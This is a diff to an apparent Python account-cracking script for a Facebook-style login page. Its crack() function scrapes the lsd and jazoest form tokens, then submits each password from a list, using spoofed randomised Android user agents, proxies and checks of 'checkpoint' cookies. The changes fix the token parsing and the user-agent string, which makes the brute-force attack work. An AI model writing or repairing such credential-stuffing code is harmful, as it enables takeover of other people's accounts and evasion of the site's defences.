@@ -123,7 +123,7 @@ for x in range(1500):
 	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
 	aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']
 #	A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
-	A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; TECNO CH{str(rr(5,9))}{str(rc(az))} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 OPR/63.0.2254.62069'
+	A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; TECNO CH7i Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 OPR/63.0.2254.62069'
 #	A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
 	B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
 #	B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
@@ -640,7 +640,7 @@ def crack(idf,pwx,url,awal):
 	for pw in pwx:
 		try:
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
-			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)[0],"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1)[0],"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
 				"upgrade-insecure-requests":"1",
@@ -655,9 +655,9 @@ def crack(idf,pwx,url,awal):
 				"sec-fetch-mode":"cors",
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
-				"accept-language":"ha,en-US;q=0.9,en;q=0.8",
+				"accept-language":"en-US;q=0.9,en;q=0.8",
 				"x-requested-with":"XMLHttpRequest",
-				}
+			}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
